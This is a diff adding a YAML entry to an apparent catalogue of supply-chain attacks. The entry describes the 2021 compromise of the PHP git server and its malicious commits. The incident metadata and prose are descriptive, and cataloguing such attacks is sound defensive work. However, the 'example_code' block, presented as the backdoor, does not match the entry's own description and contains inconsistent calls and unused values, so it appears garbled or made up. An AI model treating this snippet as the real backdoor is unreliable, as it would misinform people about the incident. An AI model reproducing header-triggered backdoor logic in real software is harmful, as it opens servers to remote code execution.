@@ -1,0 +1,53 @@
+- name: PHP
+  title: PHP git server backdoored
+  start_date: 2021-03-28
+  end_date: 2021-03-28
+  license: PHP License
+  website: https://www.php.net/
+  repo: https://github.com/php/php-src
+  attribution_type: unknown
+  component_type: Application
+  lang: C
+  cause: compromise
+  motive: backdoor insertion
+  attack_vector: git server
+  insertion_phase: source
+  impact_type: backdoor
+  references:
+    - https://news-web.php.net/php.internals/113838
+    - https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d
+  commits:
+    - c730aa26bd52829a49f2ad284b181b7e82a68d7d
+  synopsis: Attackers compromised the PHP git server and inserted two malicious commits. The malicious code added a backdoor allowing arbitrary PHP code execution via HTTP headers.
+  compromise_desc: Unknown attackers gained access to the PHP git server and pushed malicious commits under the names of known PHP maintainers Rasmus Lerdorf and Nikita Popov. The attack was quickly detected because the commits were pushed directly to the main branch instead of going through code review.
+  impact_desc: The malicious code would have allowed attackers to execute arbitrary PHP code on servers running the compromised version by sending specially crafted HTTP headers. Fortunately, the backdoor was discovered before it made it into any official PHP releases.
+  example_code: |
+    if (strcmp("PEAR", zend_get_executed_filename()) == 0 ||
+        strcmp("PEAR5", zend_get_executed_filename()) == 0) {
+        zend_try {
+            if ((NULL != (tmp = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) &&
+                Z_TYPE_P(tmp) == IS_STRING) {
+                zval rv;
+
+                ZVAL_STRING(&rv, "assert");
+                zend_string *str = zval_get_string(tmp);
+
+                if ((executor_globals->current_execute_data)->prev_execute_data) {
+                    zend_execute_data *ex = (executor_globals->current_execute_data)->prev_execute_data;
+
+                    do {
+                        zend_function *fe = ex->func;
+                        if (NULL != fe && NULL != fe->common.function_name) {
+                            if (zend_string_equals_literal(fe->common.function_name, "mail")) {
+                                zend_call_function(&rv, tmp, NULL, 0);
+                                break;
+                            }
+                        }
+                        ex = ex->prev_execute_data;
+                    } while (NULL != ex);
+                }
+                zend_string_release(str);
+            }
+        } zend_catch {
+        } zend_end_try();
+    }
